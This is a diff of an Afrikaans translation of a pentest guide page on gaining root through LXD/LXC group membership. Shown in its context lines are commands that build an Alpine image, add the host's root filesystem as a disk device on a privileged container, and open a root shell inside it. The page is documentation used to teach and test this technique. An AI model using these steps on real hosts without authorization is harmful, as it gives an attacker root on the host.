@@ -1,14 +1,16 @@
 # lxd/lxc Group - Privilege escalation
 
-Lidmaatskap van die gasheer se LXD management group (gewoonlik _**lxd**_) kan 'n pad na root bied deur volledige beheer oor die daemon toe te laat.<sup>[[1]](#references)</sup>
+{{#include ../../../banners/hacktricks-training.md}}
 
-## Exploiting without internet
+Lidmaatskap van die host se LXD management group (normaalweg _**lxd**_) kan 'n pad na root bied deur volle beheer oor die daemon toe te laat.<sup>[[1]](#references)</sup>
+
+## Exploiting sonder internet
 
 ### Method 1
 
 Jy kan 'n Alpine image aflaai om saam met LXD te gebruik vanaf 'n trusted repository.
 Canonical se LXD image server publiseer daaglikse builds: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
-Kry eenvoudig beide **lxd.tar.xz** en **rootfs.squashfs** vanaf die nuutste build (die gidsnaam is die datum).<sup>[[8]](#references)</sup>
+Laai eenvoudig beide **lxd.tar.xz** en **rootfs.squashfs** van die nuutste build af (die directory-naam is die datum).<sup>[[8]](#references)</sup>
 
 Alternatiewelik kan jy distrobuilder op jou masjien installeer deur die [project instructions](https://github.com/lxc/distrobuilder) te volg.<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
 ```bash
@@ -49,10 +51,10 @@ lxc list
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
 > [!CAUTION]
-> As jy hierdie fout kry _**Error: No storage pool found. Please create a new storage pool**_\
-> Run **`lxd init`**, stel ’n verstek storage pool op, en **herhaal** dan die vorige stuk opdragte.<sup>[[2]](#references)</sup>
+> Indien jy hierdie fout _**Error: No storage pool found. Please create a new storage pool**_ kry,\
+> Voer **`lxd init`** uit, stel ’n verstek-bergingpoel op en **herhaal** dan die vorige blok opdragte.<sup>[[2]](#references)</sup>
 
-Begin uiteindelik die container en open ’n root shell op die host filesystem:<sup>[[1]](#references)[[2]](#references)</sup>
+Begin laastens die container en open ’n root shell op die gasheer se lêerstelsel:<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
@@ -60,7 +62,7 @@ lxc exec privesc /bin/sh
 ```
 ### Metode 2
 
-Bou ’n Alpine-image en begin dit met die vlag `security.privileged=true`, wat container root na host root karteer; die mount van `/` stel dan die host-lêerstelsel binne die container bloot.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
+Bou ’n Alpine-image en begin dit met die vlag `security.privileged=true`, wat container root na host root karteer; deur `/` te mount, word die host-lêerstelsel binne die container blootgestel.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
@@ -88,7 +90,7 @@ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursiv
 - [4] [distrobuilder](https://github.com/lxc/distrobuilder)
 - [5] [Hoe om images met distrobuilder te bou](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
 - [6] [Alpine image-definisie](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
-- [7] [lxd-alpine-builder build script](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
+- [7] [lxd-alpine-builder-bouskrip](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
 - [8] [LXD image-bediener](https://images.lxd.canonical.com/)
 - [9] [Tipe: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
 {{#include ../../../banners/hacktricks-training.md}}
